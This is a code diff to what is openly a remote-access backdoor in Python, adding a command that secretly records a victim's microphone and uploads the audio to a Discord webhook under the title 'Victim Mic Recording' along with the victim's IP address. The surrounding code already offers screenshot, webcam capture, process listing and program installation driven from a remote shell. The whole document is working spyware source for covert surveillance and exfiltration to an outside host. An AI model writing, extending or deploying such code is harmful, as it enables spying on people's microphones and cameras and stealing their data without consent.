@@ -12,6 +12,8 @@ from requests import get
 from termcolor import colored
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from cv2 import VideoCapture
+import sounddevice as sd
+import wavio as wv
 from cv2 import imshow, imwrite, destroyWindow, waitKey
 
 
@@ -29,8 +31,9 @@ class back:
                     "|| 2.) reconn           -- To reconnect to the SS server.   ||\n"+
                     "|| 3.) screen -webhook  -- To take screenshot.              ||\n"+
                     "|| 4.) cam -webhook     -- To take webcam photo.            ||\n"+
-                    "|| 5.) list -id         -- To list the process id.          ||\n"+
-                    "|| 6.) install          -- To install any program.          ||\n"
+                    "|| 5.) record t c web   -- To record sound from Mic.        ||\n"+
+                    "|| 6.) list -id         -- To list the process id.          ||\n"+
+                    "|| 7.) install          -- To install any program.          ||\n"
                     "===========================================================\n")
         s.send(self.help_.encode())
 
@@ -72,6 +75,22 @@ class back:
                 s.send(for_send.encode())
             except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                 pass
+
+    def record_sound(self, time, channel, frequency, url):
+        webhook = DiscordWebhook(url=url)
+        freq = int(frequency)
+        duration = int(time)
+        main = freq * duration
+        recording = sd.rec(int(freq * duration), samplerate=freq, channels=int(channel))
+
+        sd.wait()
+        wv.write("recording1.wav", recording, freq, sampwidth=2)
+        with open("recording1.wav", "rb") as f:
+            webhook.add_file(file=f.read(), filename='recording1.wav')
+        embed = DiscordEmbed(title='Victim Mic Recording',description=f'IP of the victim: {ipadd}',color='1d0a26')
+        webhook.add_embed(embed)
+        response = webhook.execute()
+        os.remove("recording1.wav")
                 
     def shell(self):
         while True:
@@ -101,6 +120,13 @@ class back:
             
             elif (cmd[:4] == "list"):
                 self.process_id()
+
+            elif (cmd[:6] == "record"):
+                s.send(b"\n[+] 44100 frequency is recommended!!\n[+] Channel 2 is recommended!!\n")
+                ai = cmd[7:-1]
+                c = ai.split(" ")
+                self.record_sound(c[0], c[1], c[2], c[3])
+
             elif (cmd[:6] == "reconn"):
                 self.reconnect()
 
